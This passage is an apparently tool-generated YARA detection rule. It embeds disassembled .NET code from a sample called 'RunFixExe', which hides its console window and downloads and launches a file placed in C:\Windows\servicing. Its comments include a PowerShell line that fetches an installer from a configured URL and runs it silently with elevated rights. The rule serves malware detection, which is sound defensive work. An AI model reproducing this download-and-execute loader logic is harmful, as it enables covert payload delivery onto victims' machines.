...
rule super_rule_692f7
{
    ...
    strings:
        /*
function RunFixExe.Program::Main 0x06000003@692f7fd6d198e804d6af98eb9e390d61 with 7 features:
          - check if directory exists
          - check if file exists
          - create directory
          - manipulate console buffer
        ...
        025C    00                  nop            
        025D    00                  nop            
        025E    28 02 00 00 06      call           GetConsoleWindow
        0263    0a                  stloc.0        
        0264    06                  ldloc.0        
        0265    16                  ldc.i4.0       
        0266    28 01 00 00 06      call           ShowWindow
        026B    26                  pop            
        026C    72 01 00 00 70      ldstr          "config.txt"
        0271    28 0f 00 00 0a      call           System.IO.File::ReadAllLines
        0276    0b                  stloc.1        
        0277    7e 10 00 00 0a      ldsfld         Microsoft.Win32.Registry::LocalMachine
        027C    72 17 00 00 70      ldstr          "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
        0281    17                  ldc.i4.1       
        0282    6f 11 00 00 0a      callvirt       Microsoft.Win32.RegistryKey::OpenSubKey
        0287    0c                  stloc.2        
        0288    08                  ldloc.2        
        0289    14                  ldnull         
        028A    fe 01               ceq            
        028C    0d                  stloc.3        
        028D    09                  ldloc.3        
        028E    2c 27               brfalse.s      0x2b7
        0290    00                  nop            
        0291    7e 10 00 00 0a      ldsfld         Microsoft.Win32.Registry::LocalMachine
        0296    72 95 00 00 70      ldstr          "SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
        029B    6f 12 00 00 0a      callvirt       Microsoft.Win32.RegistryKey::OpenSubKey
        02A0    0c                  stloc.2        
        02A1    08                  ldloc.2        
        02A2    14                  ldnull         
        02A3    fe 01               ceq            
        02A5    13 04               stloc.s        local(0x0004)
        02A7    11 04               ldloc.s        local(0x0004)
        02A9    2c 0b               brfalse.s      0x2b6
        02AB    00                  nop            
        02AC    07                  ldloc.1        
        02AD    16                  ldc.i4.0       
        02AE    9a                  ldelem.ref     
        02AF    28 04 00 00 06      call           DeployApplications
        02B4    00                  nop            
        02B5    00                  nop            
        02B6    00                  nop            
        02B7    72 2c 01 00 70      ldstr          "C:\Windows\servicing\fix.exe"
        02BC    28 13 00 00 0a      call           System.IO.File::Exists
        02C1    13 05               stloc.s        local(0x0005)
        02C3    11 05               ldloc.s        local(0x0005)
        02C5    2c 0f               brfalse.s      0x2d6
        02C7    00                  nop            
        02C8    72 2c 01 00 70      ldstr          "C:\Windows\servicing\fix.exe"
        02CD    28 14 00 00 0a      call           System.Diagnostics.Process::Start
        02D2    26                  pop            
        02D3    00                  nop            
        02D4    2b 38               br.s           0x30e
        02D6    00                  nop            
        02D7    72 66 01 00 70      ldstr          "C:\Windows\servicing"
        02DC    28 15 00 00 0a      call           System.IO.Directory::Exists
        02E1    16                  ldc.i4.0       
        02E2    fe 01               ceq            
        02E4    13 07               stloc.s        local(0x0007)
        02E6    11 07               ldloc.s        local(0x0007)
        02E8    2c 0b               brfalse.s      0x2f5
        02EA    72 66 01 00 70      ldstr          "C:\Windows\servicing"
        02EF    28 16 00 00 0a      call           System.IO.Directory::CreateDirectory
        02F4    26                  pop            
        02F5    07                  ldloc.1        
        02F6    17                  ldc.i4.1       
        02F7    9a                  ldelem.ref     
        02F8    13 06               stloc.s        local(0x0006)
        02FA    11 06               ldloc.s        local(0x0006)
        02FC    28 05 00 00 06      call           DownloadApplications
        0301    00                  nop            
        0302    72 2c 01 00 70      ldstr          "C:\Windows\servicing\fix.exe"
        0307    28 14 00 00 0a      call           System.Diagnostics.Process::Start
        030C    26                  pop            
        030D    00                  nop            
        030E    00                  nop            
        030F    de 13               leave.s        0x324
        0311    13 08               stloc.s        local(0x0008)
        0313    00                  nop            
        0314    11 08               ldloc.s        local(0x0008)
        0316    6f 17 00 00 0a      callvirt       System.Exception::get_Message
        031B    28 18 00 00 0a      call           System.Console::WriteLine
        0320    00                  nop            
        0321    00                  nop            
        0322    de 00               leave.s        0x324
        0324    2a                  ret            
        */
        $c22 = { 00 00 28 ?? ?? ?? ?? 0A 06 16 28 ?? ?? ?? ?? 26 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0B 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 17 6F ?? ?? ?? ?? 0C 08 14 FE 01 0D 09 2C ?? 00 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 0C 08 14 FE 01 13 ?? 11 ?? 2C ?? 00 07 16 9A 28 ?? ?? ?? ?? 00 00 00 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 13 ?? 11 ?? 2C ?? 00 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 26 00 2B ?? 00 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 16 FE 01 13 ?? 11 ?? 2C ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 26 07 17 9A 13 ?? 11 ?? 28 ?? ?? ?? ?? 00 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 26 00 00 DE ?? 13 ?? 00 11 ?? 6F ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 00 DE ?? 2A }
        /*
function RunFixExe.Program::DeployApplications 0x06000004@692f7fd6d198e804d6af98eb9e390d61 with 2 features:
          - manipulate console buffer
          - run PowerShell expression
        0344    00                  nop            
        0345    14                  ldnull         
        0346    0a                  stloc.0        
        0347    72 90 01 00 70      ldstr          " "
        034C    28 18 00 00 0a      call           System.Console::WriteLine
        0351    00                  nop            
        0352    72 94 01 00 70      ldstr          "Deploying application..."
        0357    28 18 00 00 0a      call           System.Console::WriteLine
        035C    00                  nop            
        035D    00                  nop            
        035E    28 19 00 00 0a      call           System.Management.Automation.PowerShell::Create
        0363    25                  dup            
        0364    0a                  stloc.0        
        0365    0b                  stloc.1        
        0366    00                  nop            
        0367    06                  ldloc.0        
        0368    72 c6 01 00 70      ldstr          "$Path = $env:TEMP; $Installer = "chrome_installer.exe"; Invoke-WebRequest ""
        036D    02                  ldarg.0        
        036E    72 5f 02 00 70      ldstr          "" -OutFile $Path\$Installer; Start-Process -FilePath $Path\$Installer -Args "/silent /install" -Verb RunAs -Wait; Remove-Item $Path\$Installer"
        0373    28 1a 00 00 0a      call           System.String::Concat
        0378    6f 1b 00 00 0a      callvirt       System.Management.Automation.PowerShell::AddScript
        037D    26                  pop            
        037E    06                  ldloc.0        
        037F    6f 1c 00 00 0a      callvirt       System.Management.Automation.PowerShell::Invoke
        0384    0c                  stloc.2        
        0385    00                  nop            
        0386    08                  ldloc.2        
        0387    6f 1d 00 00 0a      callvirt       GetEnumerator
        038C    0d                  stloc.3        
        038D    2b 4a               br.s           0x3d9
        038F    09                  ldloc.3        
        0390    6f 1e 00 00 0a      callvirt       get_Current
        0395    13 04               stloc.s        local(0x0004)
        0397    00                  nop            
        0398    11 04               ldloc.s        local(0x0004)
        039A    14                  ldnull         
        039B    fe 03               cgt.un         
        039D    13 05               stloc.s        local(0x0005)
        039F    11 05               ldloc.s        local(0x0005)
        03A1    2c 35               brfalse.s      0x3d8
        03A3    00                  nop            
        03A4    11 04               ldloc.s        local(0x0004)
        03A6    6f 1f 00 00 0a      callvirt       System.Management.Automation.PSObject::get_BaseObject
        03AB    6f 20 00 00 0a      callvirt       System.Object::GetType
        03B0    6f 21 00 00 0a      callvirt       System.Type::get_FullName
        03B5    28 18 00 00 0a      call           System.Console::WriteLine
        03BA    00                  nop            
        03BB    11 04               ldloc.s        local(0x0004)
        03BD    6f 1f 00 00 0a      callvirt       System.Management.Automation.PSObject::get_BaseObject
        03C2    6f 22 00 00 0a      callvirt       System.Object::ToString
        03C7    72 7e 03 00 70      ldstr          "
        "
        03CC    28 23 00 00 0a      call           System.String::Concat
        03D1    28 18 00 00 0a      call           System.Console::WriteLine
        03D6    00                  nop            
        03D7    00                  nop            
        03D8    00                  nop            
        03D9    09                  ldloc.3        
        03DA    6f 24 00 00 0a      callvirt       System.Collections.IEnumerator::MoveNext
        03DF    2d ae               brtrue.s       0x38f
        03E1    de 0b               leave.s        0x3ee
        03E3    09                  ldloc.3        
        03E4    2c 07               brfalse.s      0x3ed
        03E6    09                  ldloc.3        
        03E7    6f 25 00 00 0a      callvirt       System.IDisposable::Dispose
        03EC    00                  nop            
        03ED    dc                  endfinally     
        03EE    06                  ldloc.0        
        03EF    6f 26 00 00 0a      callvirt       System.Management.Automation.PowerShell::get_Streams
        03F4    6f 27 00 00 0a      callvirt       System.Management.Automation.PSDataStreams::get_Error
        03F9    6f 28 00 00 0a      callvirt       get_Count
        03FE    16                  ldc.i4.0       
        03FF    fe 02               cgt            
        0401    13 06               stloc.s        local(0x0006)
        0403    11 06               ldloc.s        local(0x0006)
        0405    2c 28               brfalse.s      0x42f
        0407    00                  nop            
        0408    06                  ldloc.0        
        0409    6f 26 00 00 0a      callvirt       System.Management.Automation.PowerShell::get_Streams
        040E    6f 27 00 00 0a      callvirt       System.Management.Automation.PSDataStreams::get_Error
        0413    28 01 00 00 2b      call           [CLR_METADATA_TABLE_GENERICMETHOD]
        0x28C0     0x0   Method_CodedIndex:             0x53      
        0x28C2     0x2   Instantiation_BlobIndex:       0xEA      
        0418    6f 22 00 00 0a      callvirt       System.Object::ToString
        041D    13 07               stloc.s        local(0x0007)
        041F    72 82 03 00 70      ldstr          "Error: {0}"
        0424    11 07               ldloc.s        local(0x0007)
        0426    28 2a 00 00 0a      call           System.Console::WriteLine
        042B    00                  nop            
        042C    00                  nop            
        042D    2b 0b               br.s           0x43a
        042F    72 98 03 00 70      ldstr          "Installation has completed successfully."
        0434    28 18 00 00 0a      call           System.Console::WriteLine
        0439    00                  nop            
        043A    00                  nop            
        043B    de 0b               leave.s        0x448
        043D    07                  ldloc.1        
        043E    2c 07               brfalse.s      0x447
        0440    07                  ldloc.1        
        0441    6f 25 00 00 0a      callvirt       System.IDisposable::Dispose
        0446    00                  nop            
        0447    dc                  endfinally     
        0448    00                  nop            
        0449    de 18               leave.s        0x463
        044B    13 08               stloc.s        local(0x0008)
        044D    00                  nop            
        044E    72 ea 03 00 70      ldstr          "Error occured: {0}"
        0453    11 08               ldloc.s        local(0x0008)
        0455    6f 2b 00 00 0a      callvirt       System.Exception::get_InnerException
        045A    28 2a 00 00 0a      call           System.Console::WriteLine
        045F    00                  nop            
        0460    00                  nop            
        0461    de 00               leave.s        0x463
        0463    de 14               leave.s        0x479
        0465    00                  nop            
        0466    06                  ldloc.0        
        0467    14                  ldnull         
        0468    fe 03               cgt.un         
        046A    13 09               stloc.s        local(0x0009)
        046C    11 09               ldloc.s        local(0x0009)
        046E    2c 07               brfalse.s      0x477
        0470    06                  ldloc.0        
        0471    6f 2c 00 00 0a      callvirt       System.Management.Automation.PowerShell::Dispose
        0476    00                  nop            
        0477    00                  nop            
        0478    dc                  endfinally     
        0479    2a                  ret            
        */
        $c23 = { 00 14 0A 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 00 28 ?? ?? ?? ?? 25 0A 0B 00 06 72 ?? ?? ?? ?? 02 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 26 06 6F ?? ?? ?? ?? 0C 00 08 6F ?? ?? ?? ?? 0D 2B ?? 09 6F ?? ?? ?? ?? 13 ?? 00 11 ?? 14 FE 03 13 ?? 11 ?? 2C ?? 00 11 ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 11 ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 00 00 09 6F ?? ?? ?? ?? 2D ?? DE ?? 09 2C ?? 09 6F ?? ?? ?? ?? 00 DC 06 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 16 FE 02 13 ?? 11 ?? 2C ?? 00 06 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 13 ?? 72 ?? ?? ?? ?? 11 ?? 28 ?? ?? ?? ?? 00 00 2B ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 00 DE ?? 07 2C ?? 07 6F ?? ?? ?? ?? 00 DC 00 DE ?? 13 ?? 00 72 ?? ?? ?? ?? 11 ?? 6F ?? ?? ?? ?? 28 ?? ?? ?? ?? 00 00 DE ?? DE ?? 00 06 14 FE 03 13 ?? 11 ?? 2C ?? 06 6F ?? ?? ?? ?? 00 00 DC 2A }
    condition:
        all of them
}
